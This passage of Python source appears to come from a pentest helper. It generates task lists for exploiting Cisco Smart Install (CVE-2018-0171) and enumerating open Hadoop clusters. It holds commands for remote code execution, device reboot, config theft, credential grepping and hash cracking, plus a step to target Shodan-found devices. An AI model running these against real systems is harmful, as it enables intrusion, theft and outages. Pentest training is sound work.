                            'Contains device passwords/secrets',
                            'VLAN and network topology revealed'
                        ],
                        'failure_indicators': [
                            'Connection refused (Smart Install disabled)',
                            'Device patched (firmware > 2018)',
                            'Timeout (firewall blocking)',
                            'SIET not installed'
                        ],
                        'next_steps': [
                            'Analyze configuration for credentials',
                            'Extract enable password hash',
                            'Map network topology from config',
                            'Identify privilege escalation paths',
                            'Test RCE with -x flag (DANGEROUS)',
                            'Document all findings for report'
                        ],
                        'alternatives': [
                            'Manual: Craft Smart Install packets with Scapy',
                            'Metasploit module (if available)',
                            'Nmap NSE script detection: nmap --script cisco-smart-install {target}',
                            'SIET -c for device reboot (DoS test)'
                        ],
                        'notes': 'Install SIET: git clone https://github.com/frostbits-security/SIET. CVE-2018-0171 allows RCE, config theft, forced reboot. Active on Cisco Catalyst by default. CVSS 9.8/10.',
                        'estimated_time': '3-5 minutes'
                    }
                },
                {
                    'id': f'cisco-smi-siet-rce-{port}',
                    'name': 'SIET: Remote Code Execution (DANGEROUS)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit CVE-2018-0171 for RCE on Cisco device (use with EXTREME caution)',
                        'tags': ['OSCP:LOW', 'EXPLOIT', 'AUTOMATED'],
                        'alternatives': [
                            'python2 siet.py -x "show version" -i {target} (execute command)',
                            'python2 siet.py -c -i {target} (force reboot - DoS)',
                            'Manual payload crafting with Scapy'
                        ],
                        'success_indicators': [
                            'Command executed on device',
                            'Output returned',
                            'Device responds to commands'
                        ],
                        'failure_indicators': [
                            'Command failed',
                            'Device rebooted unexpectedly',
                            'Connection lost',
                            'Patched device'
                        ],
                        'next_steps': [
                            'Extract additional device info',
                            'Pivot to other network devices',
                            'Maintain persistence (if authorized)',
                            'Document exploit success'
                        ],
                        'notes': 'WARNING: RCE can crash device or cause network outage. ONLY use with explicit authorization and in controlled environment. Production networks may fail.',
                        'estimated_time': '5-10 minutes'
                    }
                }
            ]
        })

        # TASK 2: Smart Install Detection
        tasks['children'].append({
            'id': f'cisco-smi-detect-{port}',
            'name': 'Cisco Smart Install Detection',
            'type': 'command',
            'metadata': {
                'command': f'nmap -p {port} --script cisco-smart-install {target}',
                'description': 'Detect if Cisco Smart Install is active and vulnerable',
                'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'AUTOMATED'],
                'flag_explanations': {
                    f'-p {port}': f'Target port {port} (Smart Install default)',
                    '--script cisco-smart-install': 'NSE script for Smart Install detection',
                    target: 'Target IP (Cisco switch/router)'
                },
                'success_indicators': [
                    'Smart Install active',
                    'Vulnerable to CVE-2018-0171',
                    'Device model identified',
                    'IOS version revealed'
                ],
                'failure_indicators': [
                    'Port filtered/closed',
                    'Smart Install disabled',
                    'Non-Cisco device',
                    'Timeout'
                ],
                'next_steps': [
                    'If vulnerable → Exploit with SIET',
                    'Document device details',
                    'Check for other Cisco vulnerabilities',
                    'Scan entire subnet for Smart Install'
                ],
                'alternatives': [
                    f'nc {target} {port} (manual connection test)',
                    f'nmap -p {port} -sV {target} (version detection)',
                    'Shodan: port:4786 (internet-wide search)'
                ],
                'notes': 'Cisco Smart Install enabled by default on Catalyst switches. Automates OS image loading and config for new hardware. TCP port 4786.',
                'estimated_time': '2-3 minutes'
            }
        })

        # TASK 3: Configuration Analysis
        tasks['children'].append({
            'id': f'cisco-smi-config-analysis-{port}',
            'name': 'Stolen Configuration Analysis',
            'type': 'manual',
            'metadata': {
                'description': 'Analyze exfiltrated Cisco configuration for credentials and attack vectors',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'CREDENTIAL_THEFT'],
                'alternatives': [
                    'grep "password" tftp/*.cfg (search for passwords)',
                    'grep "enable secret" tftp/*.cfg (enable password hash)',
                    'grep "username" tftp/*.cfg (user accounts)',
                    'grep "crypto" tftp/*.cfg (VPN/encryption keys)',
                    'grep "snmp" tftp/*.cfg (SNMP community strings)',
                    'grep "ip route" tftp/*.cfg (network topology)'
                ],
                'success_indicators': [
                    'Passwords/hashes extracted',
                    'Enable secret hash found (crack with hashcat)',
                    'SNMP community strings discovered',
                    'VPN configurations revealed',
                    'Network topology mapped'
                ],
                'failure_indicators': [
                    'No configuration retrieved',
                    'Empty/corrupted config file',
                    'Passwords already removed from config'
                ],
                'next_steps': [
                    'Crack enable secret: hashcat -m 500 hash.txt wordlist.txt (MD5 crypt)',
                    'Test SNMP community strings',
                    'Map network from routing tables',
                    'Identify privilege escalation opportunities',
                    'Document for report'
                ],
                'notes': 'Cisco configs often contain: enable secret (MD5 hash), username/password (type 5/7), SNMP strings, VPN pre-shared keys, routing tables.',
                'estimated_time': '10-15 minutes'
            }
        })

        # TASK 4: Shodan Reconnaissance
        tasks['children'].append({
            'id': f'cisco-smi-shodan-{port}',
            'name': 'Shodan Smart Install Search',
            'type': 'manual',
            'metadata': {
                'description': 'Search Shodan for internet-exposed Cisco Smart Install',
                'tags': ['OSCP:LOW', 'RECON'],
                'alternatives': [
                    'Shodan query: port:4786',
                    'Shodan query: port:4786 "cisco"',
                    'Shodan query: port:4786 country:"US"',
                    'https://www.shodan.io/search?query=port:4786'
                ],
                'success_indicators': [
                    'Vulnerable devices found',
                    'Device models identified',
                    'Geographic distribution mapped'
                ],
                'failure_indicators': [
                    'No results (good - should not be internet-exposed)',
                    'Shodan API limit',
                    'Cisco disabled Smart Install globally'
                ],
                'next_steps': [
                    'Target discovered devices for testing',
                    'Report to Cisco PSIRT if critical infrastructure',
                    'Document for threat intelligence'
                ],
                'notes': 'Smart Install should NEVER be internet-exposed. Cisco released patches in 2018. Check IOS version: 15.x vulnerable, 16.x+ patched.',
                'estimated_time': '3-5 minutes'
            }
        })

        # TASK 5: Exploitation Notes
        tasks['children'].append({
            'id': f'cisco-smi-notes-{port}',
            'name': 'CVE-2018-0171 Exploitation Notes',
            'type': 'manual',
            'metadata': {
                'description': 'Critical exploitation details and safety warnings',
                'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                'alternatives': [
                    'CVSS Score: 9.8 (Critical)',
                    'Affected: Cisco Catalyst switches with Smart Install enabled',
                    'Patched: IOS 15.2+ (March 2018)',
                    'Attack: Specially crafted packet to TCP/4786 → buffer overflow',
                    'Impact: RCE, config theft, forced reboot (DoS)',
                    'Detection: Active by default on Catalyst 2960, 3650, 3850, etc.',
                    'SIET Tool: https://github.com/frostbits-security/SIET',
                    'Cisco Advisory: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2'
                ],
                'success_indicators': [
                    'Understanding of vulnerability mechanics',
                    'Awareness of safety implications',
                    'Knowledge of mitigation strategies'
                ],
                'next_steps': [
                    'Disable Smart Install: no vstack',
                    'Block TCP/4786 at firewall',
                    'Upgrade IOS to patched version',
                    'Monitor for exploitation attempts'
                ],
                'notes': 'CRITICAL: This exploit can CRASH production network devices. ONLY test on isolated lab equipment or with explicit authorization. Virtual Cisco images (GNS3, EVE-NG) do NOT have Smart Install - requires real hardware.',
                'estimated_time': '5-10 minutes'
            }
        })

        return tasks


@ServiceRegistry.register
class HadoopPlugin(ServicePlugin):
    """Apache Hadoop distributed system enumeration plugin"""

    @property
    def name(self) -> str:
        return "hadoop"

    @property
    def default_ports(self) -> List[int]:
        return [50030, 50060, 50070, 50075, 50090]

    @property
    def service_names(self) -> List[str]:
        return ['hadoop', 'hdfs', 'mapreduce', 'yarn']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect Hadoop services"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')
        product = port_info.get('product', '').lower()

        # Check service name
        if any(svc in service for svc in ['hadoop', 'hdfs', 'mapreduce', 'yarn']):
            return True

        # Check product
        if 'hadoop' in product:
            return True

        # Check common ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Hadoop enumeration task tree"""

        tasks = {
            'id': f'hadoop-enum-{port}',
            'name': f'Hadoop Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # Determine service type by port
        port_mapping = {
            50030: ('JobTracker', 'hadoop-jobtracker-info', 'MapReduce job coordination'),
            50060: ('TaskTracker', 'hadoop-tasktracker-info', 'MapReduce task execution'),
            50070: ('NameNode', 'hadoop-namenode-info', 'HDFS metadata and namespace'),
            50075: ('DataNode', 'hadoop-datanode-info', 'HDFS data storage'),
            50090: ('Secondary NameNode', 'hadoop-secondary-namenode-info', 'NameNode checkpoint backup')
        }

        service_name, nmap_script, description = port_mapping.get(
            port,
            ('Unknown Hadoop Service', 'hadoop-*-info', 'Unknown Hadoop component')
        )

        # TASK 1: Hadoop Component Enumeration
        tasks['children'].append({
            'id': f'hadoop-{nmap_script}-{port}',
            'name': f'{service_name} Enumeration',
            'type': 'command',
            'metadata': {
                'command': f'nmap --script {nmap_script} -p {port} {target}',
                'description': f'Enumerate {service_name}: {description}',
                'tags': ['OSCP:LOW', 'QUICK_WIN', 'AUTOMATED'],
                'flag_explanations': {
                    f'--script {nmap_script}': f'NSE script for {service_name} enumeration',
                    f'-p {port}': f'Target port {port} ({service_name})',
                    target: 'Target IP address (Hadoop cluster node)'
                },
                'success_indicators': [
                    f'{service_name} information retrieved',
                    'Hadoop version identified',
                    'Cluster status displayed',
                    'Job/task information revealed (if applicable)'
                ],
                'failure_indicators': [
                    'Connection refused',
                    'Timeout (firewall blocking)',
                    'Service not running',
                    'Wrong Hadoop component on this port'
                ],
                'next_steps': [
                    'Check for authentication (default: NONE)',
                    'Access web UI if available',
                    f'JobTracker (50030): View running jobs',
                    f'NameNode (50070): Browse HDFS filesystem',
                    f'DataNode (50075): Access data blocks',
                    'Research Hadoop version vulnerabilities',
                    'Test for unauthorized data access'
                ],
                'alternatives': [
                    f'curl http://{target}:{port}/ (web UI access)',
                    f'hdfs dfs -ls / (if HDFS client available)',
                    'Wireshark capture for protocol analysis',
                    'Browser: http://{target}:{port}'
                ],
                'notes': f'Hadoop operates WITHOUT authentication by default. {service_name} on port {port}. Kerberos integration available but rarely enabled.',
                'estimated_time': '2-3 minutes'
            }
        })

        # TASK 2: Web UI Access (if NameNode or JobTracker)
        if port in [50030, 50070]:
            ui_type = 'JobTracker' if port == 50030 else 'NameNode'
            tasks['children'].append({
                'id': f'hadoop-webui-{port}',
                'name': f'{ui_type} Web UI Access',
                'type': 'manual',
                'metadata': {
                    'description': f'Access {ui_type} web interface for cluster management',
                    'tags': ['OSCP:LOW', 'QUICK_WIN', 'MANUAL'],
                    'alternatives': [
                        f'Browser: http://{target}:{port}/',
                        f'curl http://{target}:{port}/ (command-line)',
                        f'wget http://{target}:{port}/ (download HTML)'
                    ],
                    'success_indicators': [
                        'Web UI accessible',
                        'Cluster information displayed',
                        f'{ui_type} dashboard visible',
                        'Jobs/files browsable (depending on component)'
                    ],
                    'failure_indicators': [
                        'Authentication required (Kerberos enabled)',
                        'Connection refused',
                        '404 Not Found',
                        'Firewall blocking'
                    ],
                    'next_steps': [
                        f'NameNode: Browse HDFS filesystem for sensitive data',
                        f'JobTracker: View running MapReduce jobs',
                        'Check for sensitive information in job logs',
                        'Test file upload/download capabilities',
                        'Document access for report'
                    ],
                    'notes': f'{ui_type} web UI typically unauthenticated. NameNode shows HDFS file browser. JobTracker shows job history and logs.',
                    'estimated_time': '5-10 minutes'
                }
            })

        # TASK 3: HDFS Filesystem Enumeration (if NameNode)
        if port == 50070:
            tasks['children'].append({
                'id': f'hadoop-hdfs-enum-{port}',
                'name': 'HDFS Filesystem Enumeration',
                'type': 'manual',
                'metadata': {
                    'description': 'Browse HDFS filesystem for sensitive data via NameNode web UI',
                    'tags': ['OSCP:LOW', 'MANUAL'],
                    'alternatives': [
                        f'Browser: http://{target}:50070/explorer.html',
                        f'hdfs dfs -ls / (if HDFS client installed)',
                        f'hdfs dfs -cat /path/to/file (read file)',
                        f'hdfs dfs -get /path/to/file local_file (download)',
                        f'curl http://{target}:50070/webhdfs/v1/?op=LISTSTATUS (WebHDFS API)'
                    ],
                    'success_indicators': [
                        'HDFS directories listed',
                        'Files visible in web UI',
                        'Sensitive data discovered (credentials, PII, etc.)',
                        'Database dumps, backups, or logs found'
                    ],
                    'failure_indicators': [
                        'Authentication required (Kerberos)',
                        'Empty filesystem',
                        'Access denied',
                        'HDFS client not available'
                    ],
                    'next_steps': [
                        'Download sensitive files',
                        'Search for database dumps, backups, credentials',
                        'Check MapReduce job outputs for data leakage',
                        'Test write access (upload test file)',
                        'Document findings for report'
                    ],
                    'notes': 'HDFS stores large datasets. Look for: /user/*, /tmp/*, /var/log/*. WebHDFS API allows HTTP access. Default: NO authentication.',
                    'estimated_time': '10-20 minutes'
                }
            })

        # TASK 4: Authentication Status Check
        tasks['children'].append({
            'id': f'hadoop-auth-check-{port}',
            'name': 'Hadoop Authentication Check',
            'type': 'manual',
            'metadata': {
                'description': 'Verify if Hadoop has Kerberos authentication enabled (rare)',
                'tags': ['OSCP:LOW', 'MANUAL'],
                'alternatives': [
                    f'curl http://{target}:{port}/ (check for auth prompt)',
                    'Look for Kerberos principal in web UI',
                    'Check for "authentication required" messages',
                    'Test anonymous access to files/jobs'
                ],
                'success_indicators': [
                    'No authentication required (default)',
                    'Full access to cluster resources',
                    'Files/jobs accessible anonymously'
                ],
                'failure_indicators': [
                    'Kerberos authentication enabled',
                    '401 Unauthorized',
                    'Requires kinit/keytab',
                    'Access denied'
                ],
                'next_steps': [
                    'If no auth → Enumerate freely',
                    'If Kerberos → Research Kerberos attacks',
                    'Check for other Hadoop services without auth',
                    'Document security posture'
                ],
                'notes': 'Hadoop default: NO authentication. Kerberos integration available for HDFS, YARN, MapReduce but rarely enabled in practice. Big security gap.',
                'estimated_time': '2-3 minutes'
            }
        })

        # TASK 5: Exploitation Research
        tasks['children'].append({
            'id': f'hadoop-exploit-research-{port}',
            'name': 'Hadoop Vulnerability Research',
            'type': 'manual',
            'metadata': {
                'description': 'Research Hadoop version-specific vulnerabilities and attack vectors',
                'tags': ['OSCP:LOW', 'RESEARCH'],
                'alternatives': [
                    'searchsploit hadoop',
                    'searchsploit hdfs',
                    'CVE database search: hadoop',
                    'Apache Hadoop security advisories',
                    'Shodan: port:50070 (NameNode discovery)',
                    'Shodan: port:50030 (JobTracker discovery)'
                ],
                'success_indicators': [
                    'Known vulnerabilities identified',
                    'Exploits available',
                    'Version-specific weaknesses found'
                ],
                'failure_indicators': [
                    'No public exploits',
                    'Current version patched',
                    'Too obscure/custom deployment'
                ],
                'next_steps': [
                    'Test exploits in lab environment',
                    'Develop custom attack tools if needed',
                    'Recommend Kerberos authentication',
                    'Recommend network segmentation',
                    'Document for assessment'
                ],
                'notes': 'Hadoop security model: default INSECURE. Primary issues: no auth, cleartext protocols, web UIs exposed. NOT OSCP-relevant but critical for big data pentesting.',
                'estimated_time': '10-20 minutes'
            }
        })

        return tasks
